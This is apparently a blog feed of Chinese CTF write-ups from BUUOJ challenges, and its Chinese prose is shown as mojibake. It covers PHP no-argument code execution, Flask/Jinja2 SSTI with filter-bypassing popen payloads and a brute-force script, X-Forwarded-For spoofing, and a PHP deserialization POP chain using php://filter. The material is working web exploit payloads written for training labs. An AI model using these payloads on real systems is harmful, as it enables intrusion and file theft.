<p>ä»¥ä¸Šæœ€éš¾ç†è§£çš„å°±æ˜¯ <code>localeconv()</code>ï¼Œä½†æ˜¯è¿™åˆæ˜¯æœ€å…³é”®çš„ï¼Œå› ä¸ºä¸èƒ½ä¼ å…¥å‚æ•°ï¼Œæ‰€ä»¥å¾—æƒ³æ–¹è®¾æ³•æ‰¾åˆ°è·¯å¾„ <code>/</code> å’Œ <code>.</code> ï¼Œè€Œè¯¥å‡½æ•°å°±èƒ½å¤Ÿæ‰¾åˆ°åè€…ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324200955.png" /></p>
<p>æ³¨æ„ä¸Šå›¾ä¸­çš„ç®­å¤´å¤„ï¼Œé‚£æ˜¯ <code>.</code> ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åªè¦å°†å®ƒå–å‡ºæ¥å³å¯ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°<code>current()</code> äº†ã€‚ç„¶åå†é…åˆä¸Š <code>scandir()</code> å’Œ <code>print_r</code> å°±å¯ä»¥å¾—åˆ°å½“å‰ç›®å½•ä¸‹çš„ä¿¡æ¯ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
<p>è¿”å›ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201026.png" /></p>
<p>æ³¨æ„åˆ° <code>flag.php</code> åœ¨ç¬¬4ä¸ªï¼Œæˆ–è€…è¯´æ˜¯å€’æ•°ç¬¬2ä¸ªã€‚æ­¤æ—¶æœ‰ä¸¤ç§æ–¹æ³•ï¼š</p>
<p>ç¬¬ä¸€ç§ï¼Œå°†æ•´ä¸ªæ•°ç»„åè½¬ï¼Œç„¶åç”¨ next() å–åè½¬åçš„ç¬¬äºŒä¸ªå…ƒç´ ï¼Œå³ flag.phpã€‚payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=show_source(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201059.png" /></p>
<p>ç¬¬äºŒç§æ¯”è¾ƒçœ‹è¿æ°”ï¼Œåˆ©ç”¨ <code>array_flip()</code> å°†äº¤æ¢æ•°ç»„çš„é”®å’Œå€¼</p>
<p><code>?exp=print_r(array_flip(scandir(current(localeconv()))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201121.png" /></p>
<p>ç„¶ååˆ©ç”¨ <code>array_rand(array_flip())</code> å°†æ•°ç»„çš„é”®<strong>éšæœº</strong>çš„è¯»å–</p>
<p><code>?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324201131.png" /></p>
<p>æœ€ç»ˆçš„ payloadï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?exp=highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<p>ç”±äºéšæœºæ€§ï¼Œæ‰€ä»¥éœ€è¦å¤šåˆ·æ–°å‡ æ¬¡ã€‚</p>
<h1 id="æ€»ç»“">3. æ€»ç»“</h1>
<p>ç”±äºå¯¹ PHP ä»£ç çš„ä¸ç†Ÿæ‚‰ï¼Œå¯¼è‡´æœ¬é¢˜æœ€å¤šåªèƒ½åšåˆ°ä»£ç å®¡è®¡è¿™ä¸€æ­¥ã€‚å¾—æŒ‘ä¸ªæ—¶å€™å­¦å­¦ PHP äº†ï¼Œè·‘ä¸æ‰çš„å‘€ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>gitæ³„éœ²</tag>
        <tag>RCE</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <url>/2022/04/18/GYCTF2020%20FlaskApp/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BGYCTF2020%5DFlaskApp">FlaskApp</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223449.png" /></p>
<p>ç»è¿‡æµ‹è¯•ï¼Œç¡®å®è¯¥é¢˜ç›®å¯ä»¥è¿›è¡Œbase64åŠ å¯†å’Œè§£å¯†ã€‚è¯¥é¡µé¢çš„æ¡†æ¶æ˜¯Flaskï¼Œå› æ­¤å¯èƒ½å­˜åœ¨ç€SSTIã€‚ç›´æ¥ç”¨<code>&#123;&#123;7*'7'&#125;&#125;</code>ç”¨base64åŠ å¯†åå†è§£å¯†ï¼Œå‘ç°æç¤º</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418223727.png" /></p>
<p>æ¢ä¸€ä¸ªï¼Œç”¨<code>&#123;&#123;0-0&#125;&#125;</code>ï¼Œè¿™æ—¶å€™å¾—åˆ°çš„ç»“æœå°±æ˜¯0ï¼Œå› æ­¤ç¡®å®å­˜åœ¨SSTIï¼Œå¹¶ä¸”æ¸²æŸ“å¼•æ“æ˜¯Flaskã€‚</p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
<p>å‚è€ƒï¼š<a href="Jinjia2+Flaskæ¨¡æ¿æ³¨å…¥.md">Jinjia2+Flaskæ¨¡æ¿æ³¨å…¥</a></p>
<p>è¾“å…¥ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224035.png" /></p>
<p>ç»“æœç»è¿‡äº†htmlç¼–ç ï¼Œå¯ä»¥çœ‹å‡ºç¬¬äºŒä¸ªæ‰æ˜¯<code>object</code>ã€‚</p>
<p>ä¸‹ä¸€æ­¥ï¼ŒæŸ¥çœ‹æœ‰å“ªäº›å¯ç”¨çš„å­ç±» <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°å¹¶æ²¡æœ‰ä»»ä½•ç»“æœï¼Œä½†æ˜¯å¦‚æœè¾“å…¥å¦‚ä¸‹ï¼Œ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[1]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418224237.png" /></p>
<p>æ˜¯å¯ä»¥æ˜¾ç¤ºç»“æœçš„ã€‚å› æ­¤çŒœæµ‹åå°å¯èƒ½åšäº†æŸäº›å¤„ç†ï¼Œå¦‚æœè¿”å›çš„å­—ç¬¦è¶…è¿‡ä¸€å®šçš„é•¿åº¦ï¼Œå°±ä¸æ˜¾ç¤ºç»“æœã€‚é€šè¿‡æŠ“åŒ…å‘ç°ï¼Œæ˜¯POSTæäº¤å‚æ•°testã€‚å› æ­¤ï¼Œç¼–å†™è„šæœ¬è‡ªåŠ¨åŒ–æµ‹è¯•ï¼ˆå†™çš„ä¸æ€ä¹ˆå¥½ï¼‰ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, base64, html  </span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup  </span><br><span class="line">url = <span class="string">&#x27;http://6d8599e6-3743-4264-bad5-d406f5736b3f.node4.buuoj.cn:81/decode&#x27;</span>  </span><br><span class="line">payload = <span class="string">&#x27;&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[%d]&#125;&#125;&#x27;</span>  </span><br><span class="line">results = []  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):  </span><br><span class="line">    text = payload % i  </span><br><span class="line">    text = base64.b64encode(text.encode(<span class="string">&#x27;utf-8&#x27;</span>))  </span><br><span class="line">    param=&#123;  </span><br><span class="line">        <span class="string">&#x27;text&#x27;</span>: text  </span><br><span class="line">    &#125;  </span><br><span class="line">    t = requests.post(url, params=param)  </span><br><span class="line">    soup = BeautifulSoup(t.content, <span class="string">&quot;lxml&quot;</span>)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        res = soup.body.contents[<span class="number">3</span>].div.contents[<span class="number">2</span>].strip()[<span class="number">5</span>:]  <span class="comment"># è¿”å›ç»“æœçš„å­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &lt;= <span class="number">2</span>:  <span class="comment"># å¦‚æœé•¿åº¦å¤ªçŸ­ï¼Œè¯´æ˜æ²¡æœ‰å­ç±»äº†ï¼ˆä¸çŸ¥é“æœ‰æ²¡æœ‰å¯èƒ½ä¸­é—´ç©ºäº†ä¸€ä¸ªï¼‰</span></span><br><span class="line">            <span class="keyword">break</span>  </span><br><span class="line">        res = html.unescape(res)  </span><br><span class="line">        results.append(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  </span><br><span class="line">    <span class="keyword">except</span>:  <span class="comment"># æœ‰äº›å¯èƒ½æ²¡æœ‰è¿”å›çš„ç»“æœï¼Œåšå¦å¤–å¤„ç†</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span> is error&quot;</span>)  </span><br><span class="line">        <span class="keyword">continue</span>  </span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(i) + <span class="string">&#x27;. &#x27;</span>+ res)  <span class="comment"># å¯ä»¥ä¸ç”¨è¿™å¥</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;\n&#x27;</span>  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;ress.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    f.write(<span class="built_in">str</span>.join(results)) <span class="comment"># å†™å…¥æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></p>
<p>æœ€åæŸ¥çœ‹å¾—åˆ°çš„æ–‡ä»¶ï¼Œä»ä¸­å¯»æ‰¾å¯ç”¨çš„å­ç±»ï¼Œæˆ‘æ‰ç”¨<code>127. &lt;class 'os._wrap_close'&gt;</code></p>
<p>å› æ­¤payloadå¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;popen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>å‘ç°è¢«è¿‡æ»¤äº†ï¼Œç»è¿‡æµ‹è¯•å‘ç°ï¼Œè¿‡æ»¤äº†<code>os</code>, <code>popen</code>å’Œ<code>flag</code>ã€‚ç»•è¿‡æ–¹æ³•æ¯”è¾ƒç®€å•<strong>å­—ç¬¦ä¸²æ‹¼æ¥:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225355.png" /></p>
<p>ç„¶åæŸ¥çœ‹flagçš„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;pop&#x27;+&#x27;en&#x27;](&#x27;cat /this_is_the_fl&#x27;+&#x27;ag.txt&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418225427.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>Flask</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 PYWebsite</title>
    <url>/2022/04/13/MRCTF2020%20PYWebsite/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DPYWebsite">PYWebsite</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œå‘ç°é¡µé¢å¾ˆå¤æ‚ã€‚å…ˆæŸ¥çœ‹æºç ï¼Œå‘ç°</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231227.png" /></p>
<p>è¿™æ˜¯åé¢è¾“å…¥æˆæƒç çš„æ—¶å€™è§¦å‘çš„ï¼Œæœ€å¼€å§‹è¿˜ä»¥ä¸ºç»•è¿‡<code>hex_md5</code>å°±å¯ä»¥äº†ã€‚åœ¨è¿™ä¸²ä»£ç ä¸­è¿˜æœ‰ä¸€ä¸ª<code>./flag.php</code>ã€‚</p>
<p>è®¿é—®è¯¥æ–‡ä»¶å¾—åˆ°å¦‚ä¸‹ç•Œé¢</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231351.png" /></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>é‡ç‚¹çš„æç¤º<strong>å·²ç»è®°ä½äº†è´­ä¹°è€…çš„IP......é™¤äº†è´­ä¹°è€…å’Œæˆ‘è‡ªå·±ï¼Œæ²¡äººå¯ä»¥çœ‹åˆ°flag</strong>ã€‚æ„æ€å°±æ˜¯ï¼Œè¦ä¹ˆæˆ‘ä»¬è‡ªå·±è´­ä¹°ï¼Œè¦ä¹ˆä½¿ç”¨å‡ºé¢˜è€…çš„IPå°±å¯ä»¥çœ‹åˆ°flagã€‚å‰è€…æ˜¾ç„¶ä¸å¯èƒ½ï¼Œé‚£ä¹ˆåªæœ‰åè€…ï¼Œè¿™æ—¶å€™æƒ³åˆ°äº†ä¸€ä¸ªHTTPå¤´éƒ¨ä¿¡æ¯<code>X-Forwarded-For</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231606.png" /></p>
<p>flagåœ¨æºç ä¸­å¯ä»¥æŸ¥çœ‹</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220413231627.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 Ezpop</title>
    <url>/2022/04/15/MRCTF2020%20Ezpop/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5DEzpop">Ezpop</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒï¼Œç›´æ¥å¾—åˆ°å¦‚ä¸‹æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; </span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<h2 id="å¯»æ‰¾popé“¾">å¯»æ‰¾POPé“¾</h2>
<p>é¦–å…ˆå¯»æ‰¾POPé“¾çš„å¤´éƒ¨ï¼Œå³å¦‚ä¸‹ä»£ç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br></pre></td></tr></table></figure></p>
<p>ä¼ å…¥ä¸€ä¸ªåºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ã€‚</p>
<p>æ¥ç€å¯»æ‰¾POPé“¾å°¾éƒ¨ï¼Œæ³¨æ„åˆ°<code>Modifier</code>ç±»ä¸­çš„<code>__invoke()</code>é­”æœ¯æ–¹æ³•ä¸­å­˜åœ¨è¿™æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨<code>include(''/flag')</code>è·å¾—flagï¼Œè¿™å°±æ˜¯å°¾éƒ¨ã€‚</p>
<p>ç„¶åé¡ºç€å°¾éƒ¨å¾€ä¸Šçˆ¬ã€‚å½“ç±»è¢«å½“ä½œå‡½æ•°æ‰§è¡Œçš„æ—¶å€™ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨<code>__invoke()</code>é­”æœ¯æ–¹æ³•ã€‚è€Œèƒ½å¤ŸæŠŠç±»å½“ä½œå‡½æ•°æ‰§è¡Œçš„åªæœ‰<code>$function();</code>ã€‚è‹¥<code>$function=new Modifier()</code>æ—¶ï¼Œå°±ä¼šè°ƒç”¨<code>__invoke()</code>ã€‚</p>
<p><code>$function();</code>åœ¨<code>Test</code>ç±»ä¸­çš„<code>__get()</code>é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œå½“è¯»å–ä¸å¯è®¿é—®çš„å±æ€§çš„å€¼æ—¶ï¼Œè¯¥é­”æœ¯æ–¹æ³•æ‰ä¼šè°ƒç”¨ã€‚æ­¤æ—¶æ³¨æ„åˆ°<code>Show</code>ç±»ä¸­çš„<code>return $this-&gt;str-&gt;source;</code>ï¼Œå¦‚æœ<code>$this-&gt;str=new Test()</code>ï¼Œé‚£ä¹ˆ<code>Test</code>ç±»å¯¹è±¡ä¸­å¹¶ä¸å­˜åœ¨<code>source</code>å±æ€§ï¼Œä»è€Œå°±ä¼šè§¦å‘<code>__get()</code>é­”æœ¯æ–¹æ³•ã€‚</p>
<p>è€Œ<code>return $this-&gt;str-&gt;source;</code>è¢«é­”æœ¯æ–¹æ³•<code>__toString()</code>è°ƒç”¨ï¼Œå½“ç±»è¢«å½“ä½œå­—ç¬¦ä¸²æ‰§è¡Œçš„æ—¶å€™ï¼Œæ‰ä¼šè‡ªåŠ¨è°ƒç”¨è¯¥é­”æœ¯æ–¹æ³•ã€‚å”¯ä¸€æ¯”è¾ƒç»•çš„å°±æ˜¯è¿™é‡Œã€‚æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸¤ä¸ª<code>Show</code>ç±»çš„å¯¹è±¡a,bï¼Œç„¶åä»¤<code>$a-&gt;source=$b</code>ï¼Œè¯¥ç±»ä¸­çš„<code>__wakeup()</code>é­”æœ¯æ–¹æ³•ä¼šæ‰§è¡Œ<code>preg_match()</code>ï¼Œè¿™æ ·å°±å®ç°äº†å°†<code>Show</code>ç±»å½“ä½œå­—ç¬¦ä¸²ï¼Œä»è€Œè§¦å‘<code>__toString()</code>é­”æœ¯æ–¹æ³•ã€‚</p>
<p>é€šè¿‡æˆ‘ä»¬è¾“å…¥ï¼Œä¼ å…¥ä¸€ä¸ª<code>Show</code>ç±»çš„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè®¾ç½®åˆé€‚çš„å±æ€§å€¼ï¼Œå³å¯è§¦å‘æ•´ä¸ªPOPé“¾ã€‚</p>
<p>ç»¼ä¸Šï¼ŒPOPé“¾å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ä¼ å…¥Showç±»çš„åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²-&gt;è°ƒç”¨__toString()-&gt;è°ƒç”¨Testç±»ä¸­çš„__get()é­”æœ¯æ–¹æ³•-&gt;è°ƒç”¨Modifierç±»ä¸­çš„__invoke()é­”æœ¯æ–¹æ³•-&gt;è°ƒç”¨Modifierç±»ä¸­çš„append()æ–¹æ³•ï¼Œå°†flagæ–‡ä»¶åŒ…å«</span><br></pre></td></tr></table></figure></p>
<h2 id="payloadæ„é€ ">payloadæ„é€ </h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> Test();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> Modifier();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="variable">$b</span>;  <span class="comment"># è§¦å‘__tpString</span></span><br><span class="line"><span class="variable">$b</span>-&gt;str = <span class="variable">$c</span>;     <span class="comment"># è§¦å‘__get</span></span><br><span class="line">(<span class="variable">$b</span>-&gt;str)-&gt;p = <span class="variable">$d</span>;<span class="comment"># è§¦å‘__invoke</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¾“å…¥ä¸Šé¢ä»£ç å¾—åˆ°çš„å­—ç¬¦ä¸²ï¼Œå…¶å®å¹¶æ²¡æœ‰å‡ºç°Flagï¼Œè€Œæ˜¯å‡ºç°æç¤º<code>Help Me Find FLAG!</code>ã€‚æ­¤æ—¶æƒ³åˆ°ï¼Œå¯ä»¥åˆ©ç”¨ä¼ªåè®®é…åˆæ–‡ä»¶åŒ…å«è¯»å–æ–‡ä»¶å†…å®¹ã€‚</p>
<p>å› æ­¤å°†<code>Modifier</code>ç±»ä¸­çš„<code>$var</code>å±æ€§çš„å€¼æ›¿æ¢æ‰ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>  <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>å°†è·å¾—çš„å†…å®¹è¿›è¡Œbase64è§£ç å³å¯å¾—åˆ°flagã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜è€ƒå¯Ÿçš„æ˜¯ååºåˆ—åŒ–ä¸­çš„POPé“¾ã€‚ä¸»è¦æ˜¯å°†POPé“¾ä»å¤´åˆ°å°¾ç†æ¸…æ¥šå³å¯ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHPä¼ªåè®®</tag>
        <tag>POP</tag>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>æ–‡ä»¶åŒ…å«</tag>
      </tags>
  </entry>
  <entry>
    <title>MRCTF2020 å¥—å¨ƒ</title>
    <url>/2022/04/21/MRCTF2020%20%E5%A5%97%E5%A8%83/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BMRCTF2020%5Då¥—å¨ƒ">MRCTF2020 å¥—å¨ƒ</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">1. é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒæŸ¥çœ‹é¡µé¢æºç ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(substr_count(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œæ²¡æœ‰æ›´å¤šæœ‰ç”¨çš„ä¿¡æ¯äº†ã€‚</p>
<h1 id="è§£é¢˜">2. è§£é¢˜</h1>
